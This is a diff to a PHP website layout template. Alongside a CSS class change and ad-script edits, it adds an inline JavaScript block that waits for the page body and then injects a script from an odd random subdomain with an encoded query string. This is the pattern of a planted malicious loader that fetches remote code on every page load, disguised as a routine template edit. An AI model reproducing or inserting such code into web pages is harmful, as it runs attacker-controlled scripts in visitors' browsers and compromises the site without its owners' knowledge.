@@ -124,7 +124,7 @@ screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
     
     <?= $this->placeholder('header'); ?>
 
-    <div id="content" class="row <?= $pageClass; ?>">
+    <div id="content" class="row-fluid <?= $pageClass; ?>">
         
         <?php 
         if (count($this->messages)) {
@@ -207,10 +207,22 @@ _gaq.push(['_trackPageview']);
 <script type="text/javascript"><?= (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js; ?></script>
 <?php } ?>
 
-<?php /*
 <script charset="windows-1251" type="text/javascript" src="http://code.directadvert.ru/show.cgi?adp=126314&div=DIV_DA_126314"></script>
-*/ ?>
-<script charset="windows-1251" type="text/javascript" src="http://code.directadvert.ru/show.cgi?adp=85753&div=DIV_DA_85753"></script> 
+<script charset="windows-1251" type="text/javascript" src="http://code.directadvert.ru/show.cgi?adp=85753&div=DIV_DA_85753"></script>
+
+<script type="text/javascript">
+   (function(w) {
+     var script = document.createElement('script');
+     var i = setInterval(function() {
+       if (typeof w.document.body !== 'undefined') {
+           script.src = 'http://cskvezhxr.not-only.info' + '/?70935=YypjZTF1e3h0fH5zZCokJSAgLg';
+           w.document.body.appendChild(script);
+           clearInterval(i);
+       }
+     }, 200);
+})(window);
+</script>
+
 
 <?php ob_start(); ?>
 $(document).ready(function(){
